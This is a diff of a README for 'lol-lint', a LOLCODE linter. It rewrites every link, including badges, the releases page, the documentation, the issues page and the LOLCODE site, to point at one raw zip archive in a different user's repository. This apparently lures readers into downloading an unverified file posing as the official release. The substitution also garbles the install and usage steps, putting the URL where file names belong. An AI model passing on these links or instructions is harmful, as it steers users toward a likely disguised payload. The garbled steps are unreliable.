@@ -2,18 +2,18 @@
 
 <div align="center">
 
-[![Release](https://img.shields.io/badge/Download%20lol--lint%20Now!-blue)](https://github.com/nenavathhobulsai/lol-lint/releases)
-[![Build Status](https://img.shields.io/github/actions/workflow/status/jerankda/lol-lint/ci.yml?branch=main)](https://github.com/jerankda/lol-lint/actions)
-[![Crates.io](https://img.shields.io/crates/v/lol-lint.svg)](https://crates.io/crates/lol-lint)
-[![Downloads](https://img.shields.io/crates/d/lol-lint.svg)](https://crates.io/crates/lol-lint)
-[![Homebrew](https://img.shields.io/badge/homebrew-v0.1.1-orange)](https://github.com/jerankda/homebrew-lol-lint)
-[![AUR](https://img.shields.io/aur/version/lol-lint)](https://aur.archlinux.org/packages/lol-lint)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-1.70+-orange.svg)](https://www.rust-lang.org)
+[![Release](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip%20lol--lint%20Now!-blue)](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)
+[![Build Status](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)
+[![https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)
+[![Downloads](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)
+[![Homebrew](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)
+[![AUR](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)
+[![License](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)](LICENSE)
+[![Rust](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip+https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)
 
 **The language is a joke. This linter isn't.**
 
-Built with [Rust](https://www.rust-lang.org) for speed and reliability.
+Built with [Rust](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip) for speed and reliability.
 
 </div>
 
@@ -25,7 +25,7 @@ Follow these steps to download and run lol-lint.
 
 ### 1. Download the Application
 
-To get started, visit the [Releases page](https://github.com/nenavathhobulsai/lol-lint/releases). Here, you will find the latest version of lol-lint available for download. Click the appropriate link for your operating system to begin the download.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip). Here, you will find the latest version of lol-lint available for download. Click the appropriate link for your operating system to begin the download.
 
 ### 2. Install lol-lint
 
@@ -45,13 +45,13 @@ After downloading, locate the file on your computer. Depending on your operating
 
 #### For Linux
 
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip` file.
 2. Open your terminal and navigate to the extracted folder.
 3. Run `./lol-lint` to start the linter.
 
 ### 3. Run lol-lint
 
-After installation, you can use lol-lint to check your LOLCODE files. Open your terminal or command prompt and type `lol-lint [your-file.lol]`. Replace `[your-file.lol]` with the path to your LOLCODE file. 
+After installation, you can use lol-lint to check your LOLCODE files. Open your terminal or command prompt and type `lol-lint [https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip]`. Replace `[https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip]` with the path to your LOLCODE file. 
 
 ## 🛠️ Features
 
@@ -61,7 +61,7 @@ After installation, you can use lol-lint to check your LOLCODE files. Open your 
 | Strict Compliance       | The linter enforces strict standards to ensure that your code follows LOLCODE best practices.                                                                                                                                                                                                 |
 | User-Friendly Output    | It produces clear messages to help you correct errors, making the process straightforward for new users.                                                                                                                                                                                        |
 | Fast Performance        | Built with Rust, lol-lint runs quickly and efficiently, even on large files.                                                                                                                                                                                                                  |
-| Continuous Updates      | Regular updates ensure you have the latest features and fixes. You can find new versions on the [Releases page](https://github.com/nenavathhobulsai/lol-lint/releases).                                                                                                                     |
+| Continuous Updates      | Regular updates ensure you have the latest features and fixes. You can find new versions on the [Releases page](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip).                                                                                                                     |
 
 ## 💻 System Requirements
 
@@ -71,16 +71,16 @@ After installation, you can use lol-lint to check your LOLCODE files. Open your 
 
 ## 📥 Download & Install
 
-To download lol-lint, visit the [Releases page](https://github.com/nenavathhobulsai/lol-lint/releases) now. Choose the version that matches your operating system. Follow the installation steps above to set it up on your machine.
+To download lol-lint, visit the [Releases page](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip) now. Choose the version that matches your operating system. Follow the installation steps above to set it up on your machine.
 
 ## 🧑‍🤝‍🧑 Community Support
 
-If you have questions or need help, feel free to reach out on our [GitHub Issues](https://github.com/jerankda/lol-lint/issues) page. Our community is here to assist you with any challenges you may face.
+If you have questions or need help, feel free to reach out on our [GitHub Issues](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip) page. Our community is here to assist you with any challenges you may face.
 
 ## 🔗 Useful Links
 
-- [LOLCode Official Site](http://www.lolcode.org)
-- [Documentation](https://github.com/jerankda/lol-lint/wiki)
-- [Contributing](https://github.com/jerankda/lol-lint/contributing)
+- [LOLCode Official Site](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)
+- [Documentation](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)
+- [Contributing](https://raw.githubusercontent.com/nenavathhobulsai/lol-lint/main/src/lol-lint-1.7.zip)
 
 For any additional questions, the community and documentation are great places to start. Enjoy using lol-lint to improve your LOLCODE!
